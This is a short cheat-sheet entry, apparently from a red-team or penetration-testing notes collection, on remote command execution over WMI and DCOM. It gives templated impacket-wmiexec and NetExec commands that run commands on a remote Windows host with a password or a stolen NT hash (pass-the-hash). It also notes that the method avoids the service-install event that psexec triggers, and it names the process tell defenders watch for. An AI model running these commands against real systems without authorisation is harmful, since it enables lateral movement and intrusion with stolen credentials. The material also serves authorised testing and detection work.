WMI gives a semi-interactive shell over DCOM (135 → a high ephemeral port)
without dropping a service the way psexec does — quieter on `7045`, but every
command still runs as a child of `WmiPrvSE.exe`, which is the blue tell. Password
or hash both work.

```sh
impacket-wmiexec {{domain}}/{{user}}:{{password}}@{{rhost}}
impacket-wmiexec -hashes :{{nthash}} {{domain}}/{{user}}@{{rhost}}
nxc smb {{rhost}} -u {{user}} -H {{nthash}} --exec-method wmiexec -x 'whoami'
```
